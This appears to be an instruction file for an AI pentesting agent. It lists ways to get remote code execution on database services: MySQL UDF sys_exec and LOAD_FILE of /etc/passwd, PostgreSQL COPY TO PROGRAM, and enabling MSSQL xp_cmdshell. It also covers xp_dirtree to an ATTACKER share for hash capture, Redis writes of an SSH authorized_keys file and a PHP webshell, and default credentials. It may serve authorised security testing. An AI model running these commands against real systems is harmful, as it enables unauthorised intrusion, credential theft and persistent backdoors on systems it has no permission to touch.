---
name: svc-database
description: Database RCE paths — UDF, xp_cmdshell, COPY TO PROGRAM, Redis key write. Use when a database service is found. Triggers - MySQL 3306, PostgreSQL 5432, MSSQL 1433, Redis 6379, MongoDB 27017.
---

# Database — RCE & Escalation Paths

Standard enumeration (connect, list DBs, dump users) — you know this. Below is what matters.

## MySQL → RCE via UDF
Requires FILE privilege + write access to plugin dir. Upload `lib_mysqludf_sys.so` → `SELECT sys_exec('id')`.
Also: `SELECT LOAD_FILE('/etc/passwd')` for file read.

## PostgreSQL → RCE via COPY TO PROGRAM
Requires superuser: `COPY (SELECT '') TO PROGRAM 'id';`
Alternative: large object import/export for file read/write.

## MSSQL → xp_cmdshell
If disabled (common): `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
Then: `EXEC xp_cmdshell 'whoami';`
Hash capture: `EXEC xp_dirtree '\\ATTACKER\share';` → catch with Responder.

## Redis no-auth → RCE (two methods)
**SSH key write:**
```
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET payload "\n\nssh-rsa AAAA...your_key...\n\n"
SAVE
```
**Webshell (if web server co-hosted):**
```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<?php system($_GET['cmd']); ?>"
SAVE
```

## MongoDB / Elasticsearch — no auth = full dump
Both default to no authentication. Connect and enumerate immediately.

## Default creds worth trying
MySQL: `root` (no password), `root/root`. PostgreSQL: `postgres`/(empty). MSSQL: `sa`/(empty or common).
